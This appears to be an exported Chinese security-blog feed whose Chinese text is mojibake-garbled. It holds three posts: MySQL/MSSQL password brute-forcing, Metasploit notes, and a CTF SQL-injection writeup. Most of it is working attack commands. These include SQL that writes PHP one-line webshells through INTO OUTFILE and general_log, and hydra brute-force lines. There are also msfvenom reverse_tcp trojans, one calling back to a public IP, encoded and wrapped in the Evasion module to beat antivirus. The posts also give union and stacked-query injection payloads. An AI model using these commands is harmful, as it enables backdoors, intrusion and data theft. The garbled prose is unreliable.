bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_hashdump</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>auxiliary/admin/mysql/mysql_sql</code>å¯ä»¥è¿æ¥mysqlç±»ä¼¼äºsqlmapé‡Œçš„â€“sql-shell</p><p>ä½¿ç”¨<code>auxiliary/scanner/mysql/mysql_schemadump</code>å¯ä»¥å°†æ•°æ®åº“å¯¼å‡ºåˆ°æœ¬åœ°</p><p>ä½¿ç”¨<code>auxiliary/scanner/mysql/mysql_file_enum</code>è¿›è¡Œæ–‡ä»¶æšä¸¾</p><p>ä½¿ç”¨<code>auxiliary/scanner/mysql/mysql_writable_dirs</code>è¿›è¡Œå¯å†™ç›®å½•æšä¸¾</p><h3 id="mysqlæ”»å‡»æ–¹æ³•"><a href="#mysqlæ”»å‡»æ–¹æ³•" class="headerlink" title="mysqlæ”»å‡»æ–¹æ³•"></a>mysqlæ”»å‡»æ–¹æ³•</h3><h4 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h4><p>ä¸€äº›ç½‘ç«™æºä»£ç æ–‡ä»¶ä¸­ä¼šåŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶ï¼Œé€šè¿‡æŸ¥çœ‹è¿™äº›æ–‡ä»¶å¯ä»¥è·å–æ•°æ®åº“è´¦å·å’Œå¯†ç ã€‚ä¸€èˆ¬å¸¸è§çš„æ•°æ®åº“è¿æ¥æ–‡ä»¶ä¸º<code>config.php</code>ã€<code>web.config</code>ã€<code>conn.asp</code>ã€<code>db.php/asp</code>ã€<code>jdbc.properties</code>ã€<code>sysconfig.properties</code>ã€<code>JBOSS_HOME\docs\examples\jca\XXXX-ds.xml</code>ç­‰ç­‰ã€‚</p><p>ä½¿ç”¨ultraeditç­‰ç¼–è¾‘æ–‡ä»¶ç¼–è¾‘æ•°æ®åº“é…ç½®æ–‡ä»¶åï¼Œä¼šç•™ä¸‹bakæ–‡ä»¶</p><h4 id="mysqlå†™é©¬"><a href="#mysqlå†™é©¬" class="headerlink" title="mysqlå†™é©¬"></a>mysqlå†™é©¬</h4><p>å‰æéœ€è¦çŸ¥é“ç½‘ç«™çš„çœŸå®ç‰©ç†è·¯å¾„ï¼Œä¾‹å¦‚å‘¼æ±‚å¶çœŸå®è·¯å¾„<code>D:\work\WWW</code>ï¼Œåˆ™å¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ï¼Œæ¥è·å–ä¸€å¥è¯åé—¨æ–‡ä»¶<code>cmd.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;INTO OUTFILE &#39;D:&#x2F;work&#x2F;WWW&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure><p>å½“ç„¶æˆ‘ä»¬å¯ä»¥ç”¨16è¿›åˆ¶å½¢å¼å†™å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#39;åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ç”¨0x&#39;) into dumpfile &#39;D:&#x2F;WEB&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure><p><strong>general_log_fileå†™é©¬</strong></p><p>ï¼ˆ1ï¼‰æŸ¥çœ‹generaæ–‡ä»¶é…ç½®æƒ…å†µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">global</span> variables like <span class="string">&quot;%genera%&quot;</span>;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å…³é—­general_log</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=off;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰é€šè¿‡general_logé€‰é¡¹æ¥è·å–webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">&#x27;on&#x27;</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/phpStudy/WWW/cmd.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>åœ¨æŸ¥è¯¢ä¸­æ‰§è¡Œè¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">&#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>Shellä¸ºcmd.phpï¼Œä¸€å¥è¯åé—¨ï¼Œå¯†ç ä¸ºcmdã€‚</p><h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><h3 id="hydra-3"><a href="#hydra-3" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mssql</span><br></pre></td></tr></table></figure><h3 id="msf-3"><a href="#msf-3" class="headerlink" title="msf"></a>msf</h3><p>ä½¿ç”¨<code>auxiliary/scanner/mssql/mssql_login</code>ç ´è§£å¯†ç </p><h2 id="pcanywhere-vnc-3389"><a href="#pcanywhere-vnc-3389" class="headerlink" title="pcanywhere,vnc,3389"></a>pcanywhere,vnc,3389</h2><p>åŒæ ·å¼ºå¤§çš„hydraä¹Ÿæ”¯æŒä»¥ä¸Šä¸‰ç§ï¼Œä¸è¿‡æœ€æ–°ç‰ˆæœ¬çš„hydraå¥½åƒä¸æ”¯æŒ3389çš„çˆ†ç ´äº†ï¼Œåªéœ€æ”¹å˜æœåŠ¡ç±»å‹å°±è¡Œ</p><h2 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h2><p>kaliçš„<code>/usr/share/wordlists</code>ç›®å½•ä¸‹æœ‰å¾ˆå¤š</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/Fly_hps/article/details/80943541">https://blog.csdn.net/Fly_hps/article/details/80943541</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> å¼±å£ä»¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metasploitå­¦ä¹ </title>
      <link href="2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†msfçš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯msf"><a href="#ä»€ä¹ˆæ˜¯msf" class="headerlink" title="ä»€ä¹ˆæ˜¯msf?"></a>ä»€ä¹ˆæ˜¯msf?</h2><p>msfå…¨ç§°<code>Metasploit Framework</code>ï¼Œå®ƒé›†æˆäº†å„å¹³å°ä¸Šå¸¸è§çš„æº¢å‡ºæ¼æ´å’Œæµè¡Œçš„ shellcode ï¼Œå¹¶ä¸”ä¸æ–­æ›´æ–°ï¼Œæ˜¯ç›®å‰ä¸–ç•Œä¸Šé¢†å…ˆçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ˜¯è¿„ä»Šä¸ºæ­¢ä½¿ç”¨Rubyæ„å»ºçš„æœ€å¤æ‚çš„é¡¹ç›®ä¹‹ä¸€ï¼Œæ˜¯ä¿¡æ¯å®‰å…¨ä¸æ¸—é€æµ‹è¯•é¢†åŸŸæœ€å¤§çš„å¼€æºé¡¹ç›®ä¹‹ä¸€ã€‚</p><p>ä»‹ç»å‡ ä¸ªæ¦‚å¿µï¼š</p><p><strong>POCï¼š</strong>ä¸€èˆ¬æ˜¯æŒ‡è¯æ˜æ¼æ´å­˜åœ¨çš„ä»£ç ã€‚</p><p><strong>Exploit(EXP)ï¼š</strong>æ”»å‡»ä»£ç æˆ–ç¨‹åºï¼Œå®ƒå…è®¸æ”»å‡»è€…åˆ©ç”¨æ˜“å—æ”»å‡»çš„ç³»ç»Ÿå¹¶å±å®³å…¶å®‰å…¨æ€§ï¼Œæ¯ä¸ªæ¼æ´éƒ½æœ‰å¯¹åº”çš„æ¼æ´åˆ©ç”¨ç¨‹åºã€‚é€šä¿—è§£é‡Šï¼šæ¼æ´åˆ©ç”¨è„šæœ¬</p><p><strong>Payloadï¼š</strong>æœ‰æ•ˆæ”»å‡»è½½è·ã€‚é€šä¿—è§£é‡Šå°±æ˜¯æ¼æ´åˆ©ç”¨çš„ä¸»è¦æ“ä½œï¼Œæ¯”å¦‚ä½ è¯·æ±‚æŸä¸ªurlå°±èƒ½å†™é©¬</p><p><strong>ShellCodeï¼š</strong>ä¸»è¦ç”¨åœ¨äºŒè¿›åˆ¶æº¢å‡ºæ”»å‡»ä¸Šï¼Œæ¯”å¦‚æ§åˆ¶å¡«å……æ•°æ®çš„å†…å®¹</p><h2 id="msfå…æ€"><a href="#msfå…æ€" class="headerlink" title="msfå…æ€"></a>msfå…æ€</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><h4 id="msfvenomç®€ä»‹"><a href="#msfvenomç®€ä»‹" class="headerlink" title="msfvenomç®€ä»‹"></a>msfvenomç®€ä»‹</h4><p>msfvenomæ˜¯msfpayloadå’Œmsfencodeçš„ç»“åˆä½“ï¼Œäº2015å¹´6æœˆ8æ—¥å–ä»£äº†msfpayloadå’Œmsfencodeã€‚åœ¨æ­¤ä¹‹åï¼Œmetasploit-frameworkä¸‹é¢çš„çš„msfpayloadï¼ˆè·è½½ç”Ÿæˆå™¨ï¼‰ï¼Œmsfencoderï¼ˆç¼–ç å™¨ï¼‰ï¼Œmsfcliï¼ˆç›‘å¬æ¥å£ï¼‰éƒ½ä¸å†è¢«æ”¯æŒã€‚</p><h4 id="ä¸€äº›ç®€å•çš„å‘½ä»¤"><a href="#ä¸€äº›ç®€å•çš„å‘½ä»¤" class="headerlink" title="ä¸€äº›ç®€å•çš„å‘½ä»¤"></a>ä¸€äº›ç®€å•çš„å‘½ä»¤</h4><p>æ¯”å¦‚æƒ³æŸ¥çœ‹<code>windows/meterpreter/reverse_tcp</code>æ”¯æŒä»€ä¹ˆå¹³å°ã€å“ªäº›é€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --list-options</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ‰€æœ‰payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list payloads</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ‰€æœ‰ç¼–ç å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list encoders</span><br></pre></td></tr></table></figure><p><strong>ç”Ÿæˆwindowsæœ¨é©¬</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -x encoder.exe  -i 15 -b <span class="string">&#x27;\x00&#x27;</span> -f exe -o payload.exe</span><br><span class="line"><span class="comment"># -eæŒ‡ä½¿ç”¨å“ªä¸ªç¼–ç å™¨</span></span><br><span class="line"><span class="comment"># -xæŒ‡ä»¥å“ªä¸ªæ–‡ä»¶ä¸ºæ¨¡æ¿</span></span><br><span class="line"><span class="comment"># -iæŒ‡ç¼–ç æ¬¡æ•°</span></span><br><span class="line"><span class="comment"># -bsæ˜¯æŒ‡å»é™¤åå­—èŠ‚</span></span><br><span class="line"><span class="comment"># -fæŒ‡æ–‡ä»¶ç±»å‹</span></span><br><span class="line"><span class="comment"># -oæŒ‡è¾“å‡ºæ–‡ä»¶è·¯å¾„</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å¤šé‡ç¼–ç ï¼Œä½¿ç”¨ç®¡é“è®©<code>msfvenom</code>å¯¹æ”»å‡»è½½è·å¤šé‡ç¼–ç ï¼Œå…ˆç”¨<code>shikata_ga_nai</code>ç¼–ç 20æ¬¡ï¼Œæ¥ç€æ¥10æ¬¡çš„<code>alpha_upper</code>ç¼–ç ï¼Œå†æ¥10æ¬¡çš„<code>countdown</code>ç¼–ç ï¼Œæœ€åæ‰ç”Ÿæˆä»¥<code>putty.exe</code>ä¸ºæ¨¡æ¿çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe</span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°ä½¿ç”¨çš„ç¼–ç ç±»å‹è¶Šå¤šï¼Œå…æ€ç‡å¯èƒ½ä¼šé™ä½ï¼ŒçŒœæµ‹æ˜¯å› ä¸ºå„ç§ç¼–ç å¼•å…¥äº†æ›´å¤šçš„ç‰¹å¾ç ã€‚åŒæ—¶ç”Ÿæˆçš„payloadä¹Ÿå¾ˆå¯èƒ½æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œè¿™ä¸ªä¹Ÿå’Œè¢«æ†ç»‘ç¨‹åºæœ‰ä¸€å®šå…³è”ã€‚</p><p><strong>ç”Ÿæˆlinuxæœ¨é©¬</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=47.97.210.141 LPORT=4444 -f elf &gt; shell</span><br></pre></td></tr></table></figure><p>å‚æ•°å’Œä¸Šé¢çš„ä¸€æ ·</p><h4 id="å‡ ä¸ªé‡è¦çš„ç›‘å¬å‚æ•°"><a href="#å‡ ä¸ªé‡è¦çš„ç›‘å¬å‚æ•°" class="headerlink" title="å‡ ä¸ªé‡è¦çš„ç›‘å¬å‚æ•°"></a>å‡ ä¸ªé‡è¦çš„ç›‘å¬å‚æ•°</h4><p><strong>é˜²æ­¢å‡session</strong></p><p>åœ¨å®æˆ˜ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°å‡sessionæˆ–è€…åˆšè¿æ¥å°±æ–­å¼€çš„æƒ…å†µï¼Œè¿™é‡Œè¡¥å……ä¸€äº›ç›‘å¬å‚æ•°ï¼Œé˜²æ­¢å‡æ­»ä¸å‡sessionã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span>   //å¯ä»¥åœ¨æ¥æ”¶åˆ°seesionåç»§ç»­ç›‘å¬ç«¯å£ï¼Œä¿æŒä¾¦å¬ã€‚</span><br></pre></td></tr></table></figure><p><strong>é˜²æ­¢sessionæ„å¤–é€€å‡º</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionCommunicationTimeout 0  //é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªä¼šè¯å°†åœ¨5åˆ†é’Ÿï¼ˆ300ç§’ï¼‰æ²¡æœ‰ä»»ä½•æ´»åŠ¨ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«æ€æ­»,ä¸ºé˜²æ­¢æ­¤æƒ…å†µå¯å°†æ­¤é¡¹ä¿®æ”¹ä¸º0</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionExpirationTimeout 0 //é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæ˜ŸæœŸï¼ˆ604800ç§’ï¼‰åï¼Œä¼šè¯å°†è¢«å¼ºåˆ¶å…³é—­,ä¿®æ”¹ä¸º0å¯æ°¸ä¹…ä¸ä¼šè¢«å…³é—­</span><br></pre></td></tr></table></figure><p><strong>handleråå°æŒç»­ç›‘å¬</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>exploit -j -z</code>å¯åœ¨åå°æŒç»­ç›‘å¬,-jä¸ºåå°ä»»åŠ¡ï¼Œ-zä¸ºæŒç»­ç›‘å¬ï¼Œä½¿ç”¨Jobså‘½ä»¤æŸ¥çœ‹å’Œç®¡ç†åå°ä»»åŠ¡ã€‚<code>jobs -K</code>å¯ç»“æŸæ‰€æœ‰ä»»åŠ¡ã€‚</p><p>è¿˜æœ‰ç§æ¯”è¾ƒå¿«æ·çš„å»ºç«‹ç›‘å¬çš„æ–¹å¼ï¼Œåœ¨msfä¸‹ç›´æ¥æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h3 id="Evasionå…æ€"><a href="#Evasionå…æ€" class="headerlink" title="Evasionå…æ€"></a>Evasionå…æ€</h3><p>2019å¹´1æœˆï¼Œmetasploitå‡çº§åˆ°äº†5.0ï¼Œå¼•å…¥äº†ä¸€ä¸ªæ–°çš„æ¨¡å—å«Evasionæ¨¡å—ï¼Œå®˜æ–¹å®£ç§°è¿™ä¸ªæ¨¡å—å¯ä»¥åˆ›å»ºåæ€æ¯’è½¯ä»¶çš„æœ¨é©¬ã€‚</p><p>evasionæœ‰ä»¥ä¸‹å‡ ä¸ªæ¨¡å—,å¯ä»¥ä½¿ç”¨<code>show evasion</code>è¿›è¡ŒæŸ¥çœ‹:</p><img src="/2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/TIMæˆªå›¾20200227214226.png" style="zoom:67%;"><p>ä½¿ç”¨<code>windows/windows_defender_exe</code>è¿›è¡Œç”Ÿæˆpayload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use windows/windows_defender_exe</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; <span class="built_in">set</span> filename payload.exe</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; <span class="built_in">set</span> LHOST 10.211.55.3</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; <span class="built_in">set</span> LPORT 3333</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure><h2 id="msfæº¢å‡ºæ”»å‡»"><a href="#msfæº¢å‡ºæ”»å‡»" class="headerlink" title="msfæº¢å‡ºæ”»å‡»"></a>msfæº¢å‡ºæ”»å‡»</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h4 id="cve-2019-0708"><a href="#cve-2019-0708" class="headerlink" title="cve_2019_0708"></a>cve_2019_0708</h4><p><a href="https://www.cnblogs.com/Oran9e/p/11479575.html">https://www.cnblogs.com/Oran9e/p/11479575.html</a></p><h4 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h4><p><a href="https://www.cnblogs.com/nanstar/p/12120656.html">https://www.cnblogs.com/nanstar/p/12120656.html</a></p><h4 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08-067"></a>ms08-067</h4><p><a href="https://www.cnblogs.com/feizianquan/p/10799873.html">https://www.cnblogs.com/feizianquan/p/10799873.html</a></p><p>å‚è€ƒï¼š</p><p><a href="https://www.zhihu.com/question/39878368">https://www.zhihu.com/question/39878368</a></p><p><a href="https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w">https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w</a></p><p><a href="https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA">https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA</a></p><p><a href="https://mp.weixin.qq.com/s/YnnCM7W20xScv52k_ubxYQ">https://mp.weixin.qq.com/s/YnnCM7W20xScv52k_ubxYQ</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–°æ˜¥æˆ˜ç–«èµ›game-gyctféƒ¨åˆ†writeup</title>
      <link href="2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/"/>
      <url>2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†game-gyctfçš„éƒ¨åˆ†writeupï¼</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><a href="#ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" class="headerlink" title="ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"></a>ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</h3><p>è¿™é¢˜æ˜¯æ˜¯çœŸçš„æ²¡æƒ³åˆ°ï¼</p><p>æ³¨å†Œä¸€ä¸ªè´¦å·è¿›å»å‘ç°é‡Œé¢æœ‰ä¸ªé»‘é¡µï¼Œç„¶åç”¨adminä¸‡èƒ½å¯†ç æˆåŠŸç™»é™†è¿›å»ï¼Œçœ‹åˆ°é»‘é¡µ</p><p>è¿™ä¸ªé»‘é¡µä¸æ˜¯æ¼æ´ç‚¹ï¼Œæ¼æ´ç‚¹å°±åœ¨ç™»é™†ä¸Šï¼Œå¯ä»¥ç›´æ¥è”åˆæŸ¥è¯¢ï¼Œå›æ˜¾åœ¨ç™»é™†åçš„é¡µé¢ä¸Š</p><p><strong>order by:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; order by 6#</span><br></pre></td></tr></table></figure><p>ç™»é™†å¤±è´¥ï¼Œè¯´æ˜æœ‰5åˆ—</p><p><strong>åˆ¤æ–­å›æ˜¾ä½ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3,4,5#</span><br></pre></td></tr></table></figure><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200221214528.png" style="zoom:67%;"><p>å›æ˜¾ä½ä¸ºç¬¬äºŒä¸ª</p><p><strong>æ³¨æ•°æ®åº“ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata#</span><br></pre></td></tr></table></figure><p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM%E6%88%AA%E5%9B%BE20200221215121.png"></p><p><strong>æ³¨è¡¨ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure><p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM%E6%88%AA%E5%9B%BE20200221215337.png"></p><p><strong>æ³¨å­—æ®µï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&quot;flag&quot;#</span><br></pre></td></tr></table></figure><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200221215558.png" style="zoom:80%;"><p><strong>æ³¨å†…å®¹ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(flaaag),3,4,5 from nzhaopin.flag#</span><br></pre></td></tr></table></figure><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200221215929.png" style="zoom:80%;"><p>æ®è¯´ä¸‰ä¸ªåœ°æ–¹éƒ½æœ‰æ³¨å…¥ï¼Œç™»é™†ï¼Œæ³¨å†Œï¼Œé»‘é¡µï¼Œæˆ‘çœŸæ˜¯å¤ªèœäº†</p><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>çœ‹åˆ°ç«‹é©¬æƒ³åˆ°äº†å¼ºç½‘æ¯éšä¾¿æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#è¡¨ä¸ºFlagHere</span><br><span class="line">1&#39;;desc FlagHere; #æŸ¥çœ‹è¡¨ç»“æ„ï¼Œå‘ç°æœ‰flagå­—æ®µ</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ²¡æœ‰è¿‡æ»¤handlerï¼Œå‚è§ï¼š</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p><p><a href="https://skysec.top/2019/12/13/2019-FudanCTF-Writeup">https://skysec.top/2019/12/13/2019-FudanCTF-Writeup</a></p><p>handlerç±»ä¼¼äºselectè¯­å¥ï¼Œä½†åˆä¸åŒäºåè€…ï¼Œå®ƒåªèƒ½æ¯æ¬¡æŸ¥è¯¢1æ¬¡è®°å½•</p><p>æ¯”å¦‚ï¼šé€šè¿‡handlerè¯­å¥æŸ¥è¯¢usersè¡¨çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handler users open as moonback; #æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„åˆ«å</span><br><span class="line">handler moonback read first; #è¯»å–æŒ‡å®šè¡¨&#x2F;å¥æŸ„çš„é¦–è¡Œæ•°æ®</span><br><span class="line">handler moonback read next; #è¯»å–æŒ‡å®šè¡¨&#x2F;å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®</span><br><span class="line">handler moonback read next; #è¯»å–æŒ‡å®šè¡¨&#x2F;å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®</span><br><span class="line">...</span><br><span class="line">handler moonback close; #å…³é—­å¥æŸ„</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å°±èƒ½æŸ¥å‡ºflag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> moonback;<span class="keyword">handler</span> moonback <span 